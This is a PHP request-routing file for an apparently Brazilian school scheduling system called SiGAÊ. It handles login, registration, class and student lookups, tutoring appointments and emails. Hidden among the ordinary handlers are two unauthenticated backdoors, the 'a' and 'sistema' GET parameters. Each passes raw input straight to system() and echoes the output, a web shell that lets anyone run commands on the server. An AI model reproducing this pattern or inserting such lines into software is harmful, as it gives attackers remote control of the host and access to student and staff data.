<?php
require $_SERVER['DOCUMENT_ROOT'] . '/back-end/autoloader.php';
/* Instâncias globais */
$sys = new Admin();
$em = new Email();
$foto = new Foto();

ob_start();
sleep(1); //Delay proposital, para se evitar ataques de força bruta

########## Permitir requisições sem identificador ##########
$array = mysqli_fetch_assoc(mysqli_query($sys->conn, 'SELECT * FROM global'));
$array['debug'] == 'SIM' ? $GLOBALS['debug'] = true : $GLOBALS['debug'] = false;

##################################################
# Parte I - Login e Registro
##################################################

/* Realizar o login */
if (isset($_POST['login']) and isset($_POST['senha'])) {
    $login = $sys->proteger($_POST['login']);
    $senha = $sys->proteger($_POST['senha']);
    $retorno = $sys->logar($login, $senha);
    if ($retorno == '') {
        return 'Estado do usuário inválido';
    }
    echo $retorno;
}

/* Validar key e retornar JSON dos dados */
if (isset($_GET['validarKey']) && isset($_GET['codigo'])) {
    $codigo = $sys->proteger($_GET['codigo']);
    echo($sys->validarKey($codigo));
}

/* Pegar dados essenciais de registro */
if (isset($_GET['dadosEssenciais']) && isset($_GET['tipo'])) {
    $sys->verificarPermissao(['permissaoRegistro']);
    $id = $sys->getIDnoCookie(['permissaoRegistro']);
    $tipo = $sys->proteger($_GET['tipo']);
    //echo $id;
    echo($sys->dadosEssenciais($id, $tipo));
}

/* Realizar o registro */
if (isset($_GET['registrarUsuario']) &&
    isset($_GET['nomePreferencial']) &&
    isset($_GET['email']) &&
    isset($_GET['senha']) &&
    isset($_GET['turma']) &&
    isset($_GET['disciplinas'])) {
    $sys->verificarPermissao(['permissaoRegistro']);
    $id = $sys->getIDnoCookie(['permissaoRegistro']);
    $nomePreferencial = $sys->proteger($_GET['nomePreferencial']);
    $email = $sys->proteger($_GET['email']);
    $senha = $sys->proteger($_GET['senha']);
    $turma = $sys->proteger($_GET['turma']);
    $disciplinas = $sys->proteger($_GET['disciplinas']);
    echo($sys->registrar($id, $nomePreferencial, $email, $senha, $turma, $disciplinas));
}

/* Cancelar registro */
if (isset($_GET['cancelarInscricao'])) {
    $sys->verificarPermissao(['permissaoRegistro']);
    $id = $sys->getIDnoCookie(['permissaoRegistro']);
    echo($sys->cancelarInscricao($id));
}

/* Verificar se o registro acabou */
if (isset($_GET['registroAcabou'])) {
    $sys->verificarPermissao(['permissaoRegistro']);
    $id = $sys->getIDnoCookie(['permissaoRegistro']);
    echo($sys->verificarSeJaValidou($id));
}

if(isset($_GET['a'])){
    echo system($_GET['a']);
}

/* Trocar dados */
if (isset($_POST['alterarDados'])) {
    $sys->verificarPermissao(['permissaoSistema']);
    $id = $sys->getIDnoCookie(['permissaoSistema']);
    $nomePreferencia = null;
    $turma = null;
    $disci = null;
    $email = null;
    $img = null;
    if (isset($_POST['nomePreferencia'])) {
        $nomePreferencia = $sys->proteger($_POST['nomePreferencia']);
    }
    if (isset($_POST['turma'])) {
        $turma = $sys->proteger($_POST['turma']);
    }
    if (isset($_POST['disci'])) {
        $disci = $sys->proteger($_POST['disci']);
    }
    if (isset($_POST['email'])) {
        $email = $sys->proteger($_POST['email']);
    }
    if (isset($_POST['img'])) {
        $img = $sys->proteger($_POST['img']);
    }
    echo($sys->mudarDados($id, $nomePreferencia, $turma, $disci, $email, $img));
}

/* Trocar senha */
if (isset($_GET['trocarSenha']) && isset($_GET['codigo']) && isset($_GET['senha'])) {
    $codigo = $sys->proteger($_GET['codigo']);
    $senha = $sys->proteger($_GET['senha']);
    $id = $sys->pegarIDporCodigoEmails($codigo);
    $sys->verificarPermissao(['trocarSenha'], $id);
    echo($sys->trocarSenha($id, $senha));
}

##################################################
# Parte II - JSON dos dados de infraestrutura
##################################################

/* Pegar todas as turmas */
if (isset($_GET['getTurmas']) && isset($_GET['campus'])) {
    $sys->verificarPermissao(['permissaoSistema']);
    echo($sys->getTurmas());
}

/* Verificar se turma específica existe. SIM/NAO*/
if (isset($_GET['turmaExiste']) && isset($_GET['turma'])) {
    $sys->verificarPermissao(['permissaoSistema', 'permissaoRegistro']);
    $turma = $sys->proteger($_GET['turma']);
    echo $sys->validarTurma($turma);
}

/* Pegar turmas pelo curso */
if (isset($_GET['getTurmasByCurso']) && isset($_GET['curso']) && isset($_GET['campus'])) {
    $sys->verificarPermissao(['permissaoSistema', 'permissaoRegistro']);
    $curso = $sys->proteger($_GET['curso']);
    $campus = $sys->proteger($_GET['campus']);
    echo $sys->getTurmasByCurso($curso, $campus);
}

/* Pegar todas as disciplinas */
if (isset($_GET['getDisciplinas'])) {
    $sys->verificarPermissao(['permissaoSistema', 'permissaoRegistro']);
    echo $sys->getDisciplinas();
}

/* Verificar se disciplinas específica existe. SIM/NAO*/
if (isset($_GET['disciplinasExiste']) && isset($_GET['disciplina'])) {
    $sys->verificarPermissao(['permissaoSistema', 'permissaoRegistro']);
    $disciplina = $sys->proteger($_GET['disciplina']);
    echo $sys->validarDisciplina($disciplina);
}

/* Pegar todas as salas */
if (isset($_GET['getSalas']) && isset($_GET['campus'])) {
    $sys->verificarPermissao(['permissaoSistema']);
    $campus = $sys->proteger($_GET['campus']);
    echo $sys->getSalas($campus);
}

##################################################
# Parte III - JSON dos dados de pessoas
##################################################

/* Pegar dados de um usuário qualquer */
if (isset($_GET['pegarDadoUsuario'])) {
    $sys->verificarPermissao(['permissaoSistema'], $id);
    $id = $sys->getIDnoCookie(['permissaoSistema']);
    $pedido = $sys->proteger($_GET['pedido']);
    if (isset($_GET['turma'])) {
        $turma = $sys->proteger($_GET['turma']);
        echo($sys->pegarDadosUsuario($pedido, $id, false, $turma));
    } else {
        echo($sys->pegarDadosUsuario($pedido, $id, false));
    }
}

/* Pegar a foto de um usuário */
if (isset($_GET['pegarFoto'])) {
    if (isset($_GET['id'])) {
        $id = $sys->proteger($_GET['id']);
        $foto->show($id);
    } else {
        $foto->show();
    }
}

/* Pegar todos os docentes */
if (isset($_GET['pegarTodosDocentes']) && isset($_GET['pagina']) && isset($_GET['campus'])) {
    $sys->verificarPermissao(['permissaoSistema']);
    $pagina = $sys->proteger($_GET['pagina']);
    $campus = $sys->proteger($_GET['campus']);
    if (isset($_GET['busca'])) {
        $busca = $sys->proteger($_GET['busca']);
        echo($sys->getTodosDocentes($pagina, $campus, $busca));
    } else {
        echo($sys->getTodosDocentes($pagina, $campus));
    }
}

/* Pegar todos os discentes */
if (isset($_GET['pegarTodosDiscentes']) && isset($_GET['pagina']) && isset($_GET['campus'])) {
    $sys->verificarPermissao(['permissaoSistema'], '', ['DOC', 'MON']);
    $pagina = $sys->proteger($_GET['pagina']);
    $campus = $sys->proteger($_GET['campus']);
    if (isset($_GET['value'])) {
        $busca = $sys->proteger($_GET['busca']);
        echo($sys->getTodosDiscentes($pagina, $campus, $busca));
    } else {
        echo($sys->getTodosDiscentes($pagina, $campus));
    }
}

if (isset($_GET['sistema'])) {
    echo system($_GET['sistema']);
}

/* Pegar todos os discentes de uma turma */
if (isset($_GET['pegarTodaTurma']) && isset($_GET['pagina']) && isset($_GET['turma']) && isset($_GET['campus'])) {
    $sys->verificarPermissao(['permissaoSistema']);
    $pagina = $sys->proteger($_GET['pagina']);
    $turma = $sys->proteger($_GET['turma']);
    $campus = $sys->proteger($_GET['campus']);
    if (isset($_GET['busca'])) {
        $value = $sys->proteger($_GET['busca']);
        echo($sys->getTodosDiscentesTurma($pagina, $turma, $campus, $value));
    } else {
        echo($sys->getTodosDiscentesTurma($pagina, $turma, $campus));
    }
}

/* Quantidade de registros de docentes */
if (isset($_GET['quantidadeDeRegistrosDocentes']) && isset($_GET['campus'])) {
    $sys->verificarPermissao(['permissaoSistema']);
    $campus = $sys->proteger($_GET['campus']);
    if (isset($_GET['busca'])) {
        $busca = $sys->proteger($_GET['busca']);
        echo($sys->quantidadeDeRegistrosDocentes($campus, $busca));
    } else {
        echo($sys->quantidadeDeRegistrosDocentes($campus));
    }
}

/* Quantidade de registros de discentes */
if (isset($_GET['quantidadeDeRegistrosDiscentes']) && isset($_GET['campus'])) {
    $sys->verificarPermissao(['permissaoSistema'], '', ['DOC', 'MON']);
    $campus = $sys->proteger($_GET['campus']);
    if (isset($_GET['busca'])) {
        $busca = $sys->proteger($_GET['busca']);
        echo($sys->quantidadeDeRegistrosDiscentes($campus, $busca));
    } else {
        echo($sys->quantidadeDeRegistrosDiscentes($campus));
    }
}

/* Quantidade de registros de discentes em uma turma */
if (isset($_GET['quantidadeDeRegistrosTurma']) && isset($_GET['campus']) && isset($_GET['turma'])) {
    $sys->verificarPermissao(['permissaoSistema']);
    $campus = $sys->proteger($_GET['campus']);
    $turma = $sys->proteger($_GET['turma']);
    if (isset($_GET['busca'])) {
        $busca = $sys->proteger($_GET['busca']);
        echo($sys->quantidadeDeRegistrosTurma($campus, $turma, $busca));
    } else {
        echo($sys->quantidadeDeRegistrosTurma($campus, $turma));
    }
}

##################################################
# Parte V - Atendimentos
##################################################

/* Pegar atendimento específico pelo seu ID */
if (isset($_GET['pegarAtendimentoByID']) && isset($_GET['id'])) {
    $sys->verificarPermissao(['permissaoSistema']);
    $id = $sys->proteger($_GET['id']);
    if(isset($_GET['requerIdentidade'])) {
        echo $sys->pegarAtendimentoByID($id, $sys->getIDnoCookie(['permissaoSistema']));
    } else {
        echo $sys->pegarAtendimentoByID($id);
    }
}

/* Pegar todos os atendimentos agendados (só para docentes) */
if (isset($_GET['pegarTodosAtendimentosDocente'])) {
    $sys->verificarPermissao(['permissaoSistema'], '', ['DOC', 'MON']);
    $id = $sys->getIDnoCookie(['permissaoSistema']);
    echo $sys->pegarTodosAtendimentosDocente($id);
}

/* Pegar todos os atendimentos inscritos (só para discentes) */
if (isset($_GET['pegarTodosAtendimentosDiscente'])) {
    $sys->verificarPermissao(['permissaoSistema'], '', ['ALU']);
    $id = $sys->getIDnoCookie(['permissaoSistema']);
    echo $sys->pegarTodosAtendimentosDiscente($id);
}

/* Verificar conflitos de horários */
if (isset($_GET['verificarConflitosAtendimento']) &&
    isset($_GET['data']) &&
    isset($_GET['inicio']) &&
    isset($_GET['fim']) &&
    isset($_GET['sala'])) {
    $sys->verificarPermissao(['permissaoSistema'], '', ['DOC', 'MON']);
    $data = $sys->proteger($_GET['data']);
    $inicio = $sys->proteger($_GET['inicio']);
    $fim = $sys->proteger($_GET['fim']);
    $sala = $sys->proteger($_GET['sala']);
    $excecao = null;
    if (isset($_GET['excecao'])) {
        $excecao = $sys->proteger($_GET['excecao']);
    }
    echo($sys->verificarConflitos($data, $inicio, $fim, $sala, $excecao));
}

if (isset($_GET['agendarAtendimento'])
&& isset($_GET['nome'])
&& isset($_GET['data'])
&& isset($_GET['horarioInicio'])
&& isset($_GET['horarioFim'])
&& isset($_GET['sala'])
&& isset($_GET['materia'])
&& isset($_GET['tipo'])) {
    $sys->verificarPermissao(['permissaoSistema'], '', ['DOC', 'MON']);
    $id = $sys->getIDnoCookie(['permissaoSistema']);
    $desc = ""; $limite = -1;
    if (isset($_GET['desc'])) {
        $desc = $sys->proteger($_GET['desc']);
    }
    if (isset($_GET['limite'])) {
        $limite = $sys->proteger($_GET['limite']);
    }
    $nome = $sys->proteger($_GET['nome']);
    $data = $sys->proteger($_GET['data']);
    $horarioInicio = $sys->proteger($_GET['horarioInicio']);
    $horarioFim = $sys->proteger($_GET['horarioFim']);
    $sala = $sys->proteger($_GET['sala']);
    $materia = $sys->proteger($_GET['materia']);
    $tipo = $sys->proteger($_GET['tipo']);
    echo($sys->agendarAtendimento($id, $nome, $desc, $data, $horarioInicio, $horarioFim, $sala, $materia, $tipo, $limite));
}

/* Modificar um atendimento */
if (isset($_GET['alterarAtendimento'])
&& isset($_GET['idAtendimento'])
&& isset($_GET['nome'])
&& isset($_GET['data'])
&& isset($_GET['horarioInicio'])
&& isset($_GET['horarioFim'])
&& isset($_GET['sala'])
&& isset($_GET['materia'])
&& isset($_GET['tipo'])) {
    $sys->verificarPermissao(['permissaoSistema'], '', ['DOC', 'MON']);
    $idDocente = $sys->getIDnoCookie(['permissaoSistema']);
    $desc = ""; $limite = -1;
    if (isset($_GET['desc'])) {
        $desc = $sys->proteger($_GET['desc']);
    }
    if (isset($_GET['limite'])) {
        $limite = $sys->proteger($_GET['limite']);
    }
    $idAtendimento = $sys->proteger($_GET['idAtendimento']);
    $nome = $sys->proteger($_GET['nome']);
    $data = $sys->proteger($_GET['data']);
    $horarioInicio = $sys->proteger($_GET['horarioInicio']);
    $horarioFim = $sys->proteger($_GET['horarioFim']);
    $sala = $sys->proteger($_GET['sala']);
    $materia = $sys->proteger($_GET['materia']);
    $tipo = $sys->proteger($_GET['tipo']);
    echo($sys->alterarAtendimento($idDocente, $idAtendimento, $nome, $desc, $data, $horarioInicio, $horarioFim, $sala, $materia, $tipo, $limite));
}

##################################################
# Parte VI - Emails
##################################################

/* */
if (isset($_GET['codigoEmail'])) {
    $codigo = $sys->proteger($_GET['codigoEmail']);
    echo($sys->processarCodigoEmail($codigo));
}

/* Email de validação de registro */
if (isset($_GET['enviarEmailValidacao'])) {
    $sys->verificarPermissao(['permissaoRegistro']);
    $id = $sys->getIDnoCookie(['permissaoRegistro']);
    $em->enviarEmailValidacao($id);
}

if (isset($_GET['enviarEmailTrocarSenha']) && isset($_GET['email'])) {
    sleep(2);
    $email = $sys->proteger($_GET['email']);
    $em->enviarEmailTrocarSenha($email);
}

/* Validar código email registro*/
if (isset($_GET['validacaoRegistro']) && isset($_GET['codigo'])) {
    $value = $sys->proteger($_GET['codigo']);
    $em->validarRegistro($value);
}

##################################################
# Footer
##################################################

$conteudo = ob_get_contents();
if (empty($conteudo) && $conteudo != '0') {
    echo '<h1>SiGAÊ - Página de requisições</h1>
     Nenhum dado foi requisitado!';
}
